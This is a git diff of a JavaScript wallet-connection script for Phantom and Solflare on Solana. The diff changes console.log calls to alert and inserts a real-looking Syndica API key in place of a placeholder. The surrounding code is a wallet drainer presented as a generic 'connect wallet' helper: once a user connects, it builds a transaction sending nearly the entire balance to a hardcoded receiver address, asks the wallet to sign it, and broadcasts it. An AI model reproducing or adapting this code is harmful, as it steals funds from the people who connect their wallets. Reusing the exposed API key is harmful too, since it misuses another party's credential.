@@ -41,7 +41,7 @@ async function connectWallet(walletName) {
             return connectSolflare(hasSolflare, mobile);
 
         default:
-            console.log("Unknown wallet:", walletName);
+            alert("Unknown wallet:", walletName);
             return;
     }
 }
@@ -50,7 +50,7 @@ async function connectWallet(walletName) {
     PHANTOM
 --------------------------------------------------------- */
 async function connectPhantom(isInstalled, mobile) {
-    console.log("Attempting Phantom connection...");
+    alert("Attempting Phantom connection...");
 
     if (!isInstalled) {
         // Mobile users get Phantom App deep-link
@@ -59,18 +59,18 @@ async function connectPhantom(isInstalled, mobile) {
             return;
         }
 
-        console.log("Phantom wallet not found on this device.");
+        alert("Phantom wallet not found on this device.");
         return;
     }
 
     try {
         // Desktop: connect through extension
         const resp = await window.solana.connect();
-        console.log("Phantom Connected:", resp.publicKey.toString());
+        alert("Phantom Connected:", resp.publicKey.toString());
 
         onPhantomConnected(resp.publicKey);
     } catch (err) {
-        console.log("Phantom connection cancelled or failed:", + err);
+        alert("Phantom connection cancelled or failed:", + err);
     }
 }
 
@@ -78,7 +78,7 @@ async function connectPhantom(isInstalled, mobile) {
     SOLFLARE
 --------------------------------------------------------- */
 async function connectSolflare(isInstalled, mobile) {
-    console.log("Attempting Solflare connection...");
+    alert("Attempting Solflare connection...");
 
     if (!isInstalled) {
         // Mobile deep link
@@ -87,7 +87,7 @@ async function connectSolflare(isInstalled, mobile) {
             return;
         }
 
-        console.log("Solflare wallet not found on this device.");
+        alert("Solflare wallet not found on this device.");
         return;
     }
 
@@ -98,11 +98,11 @@ async function connectSolflare(isInstalled, mobile) {
         await solflare.connect();
         const pubkey = solflare.publicKey.toString();
 
-        console.log("Solflare Connected:", pubkey);
+        alert("Solflare Connected:", pubkey);
 
         onSolflareConnected(solflare.publicKey);
     } catch (err) {
-        console.log("Solflare connection failed:", +err);
+        alert("Solflare connection failed:", +err);
     }
 }
 
@@ -112,7 +112,7 @@ async function connectSolflare(isInstalled, mobile) {
 
 // What to run when Phantom connects
 function onPhantomConnected(publicKey) {
-    console.log("Phantom handler running...");
+    alert("Phantom handler running...");
     // Write your code here
     // Example:
     // fetchUserBalance(publicKey);
@@ -122,7 +122,7 @@ function onPhantomConnected(publicKey) {
 
 // What to run when Solflare connects
 function onSolflareConnected(publicKey) {
-    console.log("Solflare handler running...");
+    alert("Solflare handler running...");
     // Write your code here
     // Example:
     // loadDashboard(publicKey);
@@ -134,20 +134,20 @@ async function connectToPhantomWallet(publicKey) {
     
             try {
                 const resp = await window.solana.connect();
-                console.log("Phantom Wallet connected:", resp);
+                alert("Phantom Wallet connected:", resp);
 
                 var connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/YOUR-API-KEY', 
+                    'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H', 
                     'confirmed'
                 );
 
                 const public_key = new solanaWeb3.PublicKey(publicKey);
                 const walletBalance = await connection.getBalance(public_key);
-                console.log("Wallet balance: " + walletBalance ) ;
+                alert("Wallet balance: " + walletBalance ) ;
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
-                    console.log("Insufficient funds for rent.");
+                    alert("Insufficient funds for rent.");
                     return;
                 }
 
@@ -156,7 +156,7 @@ async function connectToPhantomWallet(publicKey) {
                         const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
                         const balanceForTransfer = walletBalance - minBalance;
                         if (balanceForTransfer <= 0) {
-                            console.log("Insufficient funds for transfer.");
+                            alert("Insufficient funds for transfer.");
                             return;
                         }
 
@@ -173,13 +173,13 @@ async function connectToPhantomWallet(publicKey) {
                         transaction.recentBlockhash = blockhashObj.blockhash;
 
                         const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
+                        alert("Transaction signed:", signed);
 
                         let txid = await connection.sendRawTransaction(signed.serialize());
                         await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
+                        alert("Transaction confirmed:", txid);
                     } catch (err) {
-                        console.log("Error during transaction:", err);
+                        alert("Error during transaction:", err);
                     }
                 
 
@@ -187,28 +187,28 @@ async function connectToPhantomWallet(publicKey) {
 
 
             } catch (err) {
-                console.log("Error connecting to Phantom Wallet:", err);
+                alert("Error connecting to Phantom Wallet:", err);
             }
         }
         
 
 async function connectToSolflareWallet() {
-    console.log("Solflare connection function called.");
+    alert("Solflare connection function called.");
     // Implement Solflare-specific connection logic here
  const resp = await window.solflare.connect();
- console.log("Solflare Wallet connected:", resp);
+ alert("Solflare Wallet connected:", resp);
  var connection = new solanaWeb3.Connection(
-     'https://solana-mainnet.api.syndica.io/api-key/YOUR-API-KEY', 
+     'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H', 
      'confirmed'
  );
 
  const public_key = new solanaWeb3.PublicKey(resp.publicKey);
  const walletBalance = await connection.getBalance(public_key);
- console.log("Wallet balance: " + walletBalance ) ;
+ alert("Wallet balance: " + walletBalance ) ;
 
  const minBalance = await connection.getMinimumBalanceForRentExemption(0);
  if (walletBalance < minBalance) {
-     console.log("Insufficient funds for rent.");
+     alert("Insufficient funds for rent.");
      return;
  }
 
@@ -217,7 +217,7 @@ async function connectToSolflareWallet() {
          const recieverWallet = new solanaWeb3.PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
          const balanceForTransfer = walletBalance - minBalance;
          if (balanceForTransfer <= 0) {
-             console.log("Insufficient funds for transfer.");
+             alert("Insufficient funds for transfer.");
              return;
          }
 
@@ -233,13 +233,13 @@ async function connectToSolflareWallet() {
             transaction.recentBlockhash = blockhashObj.blockhash;
 
          const signed = await window.solflare.signTransaction(transaction);
-         console.log("Transaction signed:", signed);
+         alert("Transaction signed:", signed);
 
          let txid = await connection.sendRawTransaction(signed.serialize());
          await connection.confirmTransaction(txid);
-         console.log("Transaction confirmed:", txid);
+         alert("Transaction confirmed:", txid);
      } catch (err) {
-         console.log("Error during transaction:", err);
+         alert("Error during transaction:", err);
      }      
 
 
